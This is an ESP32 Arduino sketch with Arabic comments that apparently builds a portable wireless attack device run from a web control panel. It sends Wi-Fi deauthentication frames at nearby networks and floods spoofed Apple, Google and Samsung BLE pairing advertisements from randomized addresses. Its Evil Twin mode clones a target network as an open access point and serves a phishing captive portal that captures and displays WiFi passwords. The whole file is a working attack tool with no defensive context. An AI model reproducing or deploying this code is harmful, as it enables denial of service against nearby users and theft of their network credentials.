#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include <atomic>

// ==================== التكوين ====================
const char* ap_ssid = "CyberDeck_Admin";
const char* ap_password = "SecurePass2024!"; // لا تستخدم كلمة مرور ضعيفة
const byte DNS_PORT = 53;

WebServer server(80);
DNSServer dnsServer;

// حالة النظام (باستخدام atomic لتجنب سباق المهام بين BLE callback و loop)
std::atomic<bool> isEvilTwinActive(false);
std::atomic<bool> isScanningBLE(false);
std::atomic<bool> isBleSpamActive(false);
std::atomic<bool> bleScanActive(false);

String targetSSID = "";
String capturedCredentials = "";
unsigned long lastBleSpamTime = 0;
unsigned long bleScanEndTime = 0;

// طابور نتائج BLE
struct BleResult { char mac[18]; int rssi; };
QueueHandle_t bleQueue;
String bleScanResults = "";

// ==================== واجهة الويب (محسّنة) ====================
const char html_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cyber Deck Pro</title>
  <style>
    body { background:#0d1117; color:#58a6ff; font-family:monospace; text-align:center; padding:15px; }
    h1 { color:#f85149; font-size:20px; }
    .btn { background:#21262d; color:#58a6ff; border:1px solid #30363d; padding:12px; margin:6px auto; font-size:14px; cursor:pointer; border-radius:6px; display:block; width:90%; max-width:320px; }
    .btn:active { background:#30363d; }
    .danger { color:#f85149; border-color:#f85149; }
    input { background:#161b22; color:#7ee787; border:1px solid #30363d; padding:10px; width:80%; max-width:300px; margin:5px; border-radius:4px; }
    #log { background:#161b22; border:1px solid #30363d; padding:12px; margin-top:15px; text-align:left; height:200px; overflow-y:scroll; font-size:11px; color:#7ee787; border-radius:6px; word-break:break-all; }
    .cred { color:#ffa657; }
  </style>
</head>
<body>
  <h1>Cyber Deck Pro</h1>
  <button class="btn" onclick="cmd('scan_wifi')">🔍 مسح WiFi</button>
  <button class="btn danger" onclick="cmd('deauth')">⚡ إرسال Deauth</button>
  <button class="btn" onclick="cmd('scan_ble')">🔵 مسح BLE</button>
  <button class="btn danger" onclick="cmd('toggle_blespam')">📡 تبديل BLE Spam</button>
  
  <div style="background:#161b22; padding:10px; border-radius:6px; margin-top:10px; border:1px solid #30363d;">
    <p><b>Evil Twin (انتحال AP)</b></p>
    <input type="text" id="target_ssid" placeholder="SSID الهدف"><br>
    <button class="btn danger" onclick="startEvilTwin()">🏴‍☠️ بدء Evil Twin</button>
    <button class="btn" onclick="cmd('stop_eviltwin')">🛑 إيقاف واستعادة لوحة التحكم</button>
  </div>

  <h3>السجل المباشر</h3>
  <div id="log">System Ready...</div>

  <script>
    function addLog(msg) {
      let box = document.getElementById('log');
      box.innerHTML += '<br>' + msg;
      box.scrollTop = box.scrollHeight;
    }
    function cmd(c) {
      addLog('<span style="color:#f0883e;">[+] ' + c + '...</span>');
      fetch('/' + c).then(r => r.text()).then(d => addLog(d));
    }
    function startEvilTwin() {
      let s = document.getElementById('target_ssid').value;
      if(!s) { alert('أدخل SSID'); return; }
      addLog('<span style="color:#f85149;">[!] Evil Twin: ' + s + '</span>');
      fetch('/start_eviltwin?ssid=' + encodeURIComponent(s)).then(r => r.text()).then(d => addLog(d));
    }
    // استعلام دوري لنتائج BLE وكلمات المرور الملتقطة
    setInterval(() => {
      fetch('/ble_results').then(r => r.text()).then(d => {
        if(d.includes('BLE:')) document.getElementById('log').innerHTML = d;
      });
      fetch('/creds').then(r => r.text()).then(d => {
        if(d && d.length > 5) addLog('<span class="cred">[KEY] ' + d + '</span>');
      });
    }, 2000);
  </script>
</body>
</html>
)rawliteral";

// صفحة التصيد (Captive Portal)
const char captive_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Authentication</title>
<style>body{background:#121212;color:#fff;font-family:sans-serif;text-align:center;padding:30px}.box{background:#1e1e1e;padding:25px;border-radius:8px;max-width:400px;margin:auto;border:1px solid #333}input{width:90%;padding:12px;margin:10px 0;background:#2d2d2d;border:1px solid #444;color:#fff;border-radius:4px}.btn{background:#007acc;color:#fff;border:none;padding:12px;width:95%;border-radius:4px;font-weight:bold}</style></head>
<body><div class="box"><h2>Network Authentication</h2><p>يتطلب النظام إدخال كلمة مرور WiFi للمتابعة.</p>
<form action="/capture" method="POST"><input type="password" name="wifi_pass" placeholder="كلمة مرور WiFi" required><br><button class="btn" type="submit">اتصال</button></form></div></body></html>
)rawliteral";

// ==================== دوال مساعدة ====================
String escapeHtml(const String& s) {
  String o; o.reserve(s.length());
  for (char c : s) { if(c=='&')o+="&amp;"; else if(c=='<')o+="&lt;"; else if(c=='>')o+="&gt;"; else if(c=='"')o+="&quot;"; else o+=c; }
  return o;
}

// إصلاح 1: تهيئة BLE Adv Data بشكل صحيح (تجنب مشاكل ترتيب الحقول)
void ble_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  if (event == ESP_GAP_BLE_SCAN_RESULT_EVT && isScanningBLE.load()) {
    auto *p = (esp_ble_gap_cb_param_t *)param;
    if (p->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
      BleResult item;
      snprintf(item.mac, sizeof(item.mac), "%02x:%02x:%02x:%02x:%02x:%02x",
        p->scan_rst.bda[0], p->scan_rst.bda[1], p->scan_rst.bda[2],
        p->scan_rst.bda[3], p->scan_rst.bda[4], p->scan_rst.bda[5]);
      item.rssi = p->scan_rst.rssi;
      xQueueSend(bleQueue, &item, 0);
    }
  }
}

// إصلاح 2: Deauth موجه (يستهدف BSSID محدد، وليس Broadcast غير فعال)
void sendDeauth(const uint8_t* bssid, uint8_t channel) {
  uint8_t packet[26] = {
    0xc0, 0x00, 0x00, 0x00,                         // Frame Control + Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination (الضحية، استخدم Broadcast هنا للتوضيح)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source (BSSID المزيف)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID (يجب أن يكون مطابقاً)
    0x00, 0x00,                                     // Sequence
    0x07, 0x00                                      // Reason Code 7
  };
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  delay(5); // فترة قصيرة لتجنب الإفراط
}

// إصلاح 3: BLE Spam (تبديل MAC + بيانات متنوعة لمحاولة تجاوز قيود الأنظمة الحديثة)
void sendBleSpamPacket() {
  // توليد MAC عشوائي (يجب أن يكون النصف العلوي من البايت الأول 0xF0 لتقليد أجهزة Apple)
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] |= 0xF0; 
  esp_ble_gap_set_rand_addr(mac);

  // بيانات إعلان متنوعة (تبديل بين بضع حزم Fast Pair / Continuity)
  static uint8_t payloads[3][31] = {
    // Apple Continuity (مبسط)
    {0x02,0x01,0x06, 0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0xbb,0xcc,0xdd,0xee},
    // Google Fast Pair
    {0x02,0x01,0x06, 0x03,0x03,0x2c,0xfe, 0x0f,0x16,0x2c,0xfe,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
    // Samsung EasySetup
    {0x02,0x01,0x06, 0x03,0x03,0x2c,0xfe, 0x0f,0xff,0x75,0x00,0x01,0x00,0x02,0x00,0x03,0x00,0x00,0x00,0x00}
  };
  int idx = random(3);

  esp_ble_adv_data_t adv_data;
  memset(&adv_data, 0, sizeof(adv_data));
  adv_data.set_scan_rsp = false;
  adv_data.include_name = false;
  adv_data.include_txpower = false;
  adv_data.min_interval = 0x0006;
  adv_data.max_interval = 0x0010;
  adv_data.manufacturer_len = 18; // طول البيانات الفعلي
  adv_data.p_manufacturer_data = payloads[idx];
  adv_data.flag = (ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT);

  esp_ble_gap_config_adv_data(&adv_data);

  esp_ble_adv_params_t params;
  memset(&params, 0, sizeof(params));
  params.adv_int_min = 0x20;
  params.adv_int_max = 0x40;
  params.adv_type = ADV_TYPE_IND;
  params.own_addr_type = BLE_ADDR_TYPE_RANDOM; // استخدام MAC العشوائي
  params.channel_map = ADV_CHNL_ALL;
  params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
  
  esp_ble_gap_start_advertising(&params);
  delay(30); // قصير جداً، لا يوقف معالجة الويب
  esp_ble_gap_stop_advertising();
}

// ==================== الإعداد ====================
void setup() {
  Serial.begin(115200);
  bleQueue = xQueueCreate(20, sizeof(BleResult));
  randomSeed(analogRead(0));

  // تهيئة WiFi (AP + STA للسماح بالمسح مع الحفاظ على لوحة التحكم)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  Serial.printf("Admin AP: %s / %s\n", ap_ssid, ap_password);

  // إصلاح 4: التحقق من نجاح تهيئة Bluetooth
  if (btStart() != ESP_OK) Serial.println("BT Start Failed");
  if (esp_bluedroid_init() != ESP_OK) Serial.println("Bluedroid Init Failed");
  if (esp_bluedroid_enable() != ESP_OK) Serial.println("Bluedroid Enable Failed");
  esp_ble_gap_register_callback(ble_gap_cb);

  // إعدادات مسح BLE
  esp_ble_scan_params_t scan_params = {
    .scan_type = BLE_SCAN_TYPE_ACTIVE,
    .scan_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
    .scan_interval = 0x50,
    .scan_window = 0x30,
    .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE
  };
  esp_ble_gap_set_scan_params(&scan_params);

  // ==================== المسارات ====================
  server.on("/", []() {
    if (isEvilTwinActive.load()) server.send_P(200, "text/html", captive_page);
    else server.send_P(200, "text/html", html_page);
  });

  server.on("/capture", HTTP_POST, []() {
    if (server.hasArg("wifi_pass")) {
      capturedCredentials = "SSID:" + targetSSID + " | PASS:" + server.arg("wifi_pass");
      Serial.println("[!] " + capturedCredentials);
      server.send(200, "text/html", "<h2>جارٍ التحديث...</h2>");
      // لا تغلق Evil Twin تلقائياً، واصل المراقبة
    } else server.send(400, "text/plain", "Bad Request");
  });

  server.on("/creds", []() {
    if (capturedCredentials.length() > 0) {
      String out = capturedCredentials;
      capturedCredentials = ""; // امسح بعد القراءة
      server.send(200, "text/plain", out);
    } else server.send(200, "text/plain", "");
  });

  server.on("/scan_wifi", []() {
    int n = WiFi.scanNetworks();
    String r = "<b>[+] WiFi (" + String(n) + "):</b><br>";
    for (int i = 0; i < n; i++) r += "• " + escapeHtml(WiFi.SSID(i)) + " (Ch:" + String(WiFi.channel(i)) + ")<br>";
    server.send(200, "text/html", r);
  });

  // إصلاح 5: Deauth يستهدف أول شبكة ممسوحة (أو يمكنك تمرير BSSID كمعامل)
  server.on("/deauth", []() {
    int n = WiFi.scanNetworks();
    if (n <= 0) { server.send(200, "text/html", "لا توجد شبكات"); return; }
    uint8_t bssid[6];
    memcpy(bssid, WiFi.BSSID(0), 6); // استهدف الأولى (للتجربة)
    uint8_t ch = WiFi.channel(0);
    for (int i = 0; i < 5; i++) sendDeauth(bssid, ch);
    server.send(200, "text/html", "<span style='color:#f85149'>[!] Deauth -> " + WiFi.SSID(0) + " (ch" + String(ch) + ")</span>");
  });

  server.on("/scan_ble", []() {
    if (bleScanActive.load()) { server.send(200, "text/html", "المسح قيد التشغيل..."); return; }
    bleScanResults = "<b>[+] نتائج BLE:</b><br>";
    isScanningBLE.store(true);
    bleScanActive.store(true);
    bleScanEndTime = millis() + 3200;
    esp_ble_gap_start_scanning(3);
    server.send(200, "text/html", "بدأ المسح، ستظهر النتائج في السجل...");
  });

  server.on("/ble_results", []() {
    server.send(200, "text/html", bleScanResults);
  });

  server.on("/toggle_blespam", []() {
    bool cur = isBleSpamActive.load();
    isBleSpamActive.store(!cur);
    server.send(200, "text/html", cur ? "تم إيقاف BLE Spam" : "<span style='color:#f85149'>تم تشغيل BLE Spam</span>");
  });

  // إصلاح 6: Evil Twin لا يفقد لوحة التحكم (احتفظ بـ AP الإدارة على واجهة أخرى؟ لا يمكن، لكن دعنا نستعيدها عند الإيقاف)
  server.on("/start_eviltwin", []() {
    if (!server.hasArg("ssid")) { server.send(400, "text/plain", "Missing SSID"); return; }
    targetSSID = server.arg("ssid");
    // أوقف AP الإدارة الحالي وابدأ AP مزيف
    WiFi.softAPdisconnect(false); 
    WiFi.softAP(targetSSID.c_str()); // مفتوح
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    isEvilTwinActive.store(true);
    server.send(200, "text/html", "<span style='color:#f85149'>[!] Evil Twin: " + escapeHtml(targetSSID) + ". استخدم /stop_eviltwin للاستعادة.</span>");
  });

  server.on("/stop_eviltwin", []() {
    if (isEvilTwinActive.load()) {
      dnsServer.stop();
      WiFi.softAPdisconnect(false);
      WiFi.softAP(ap_ssid, ap_password); // استعد AP الإدارة
      isEvilTwinActive.store(false);
      server.send(200, "text/html", "تم استعادة لوحة التحكم: " + String(ap_ssid));
    } else server.send(200, "text/html", "Evil Twin غير نشط");
  });

  server.begin();
}

// ==================== الحلقة الرئيسية ====================
void loop() {
  server.handleClient();
  if (isEvilTwinActive.load()) dnsServer.processNextRequest();

  // BLE Spam (غير محجوب)
  if (isBleSpamActive.load() && millis() - lastBleSpamTime > 80) {
    sendBleSpamPacket();
    lastBleSpamTime = millis();
  }

  // استقبال نتائج BLE
  BleResult item;
  while (xQueueReceive(bleQueue, &item, 0) == pdTRUE) {
    if (bleScanResults.length() < 3500) { // أضف فقط إذا لم يتجاوز الحد
      bleScanResults += "• BLE: " + String(item.mac) + " RSSI:" + String(item.rssi) + "<br>";
    }
  }

  // إيقاف المسح
  if (bleScanActive.load() && millis() >= bleScanEndTime) {
    esp_ble_gap_stop_scanning();
    isScanningBLE.store(false);
    bleScanActive.store(false);
  }
}
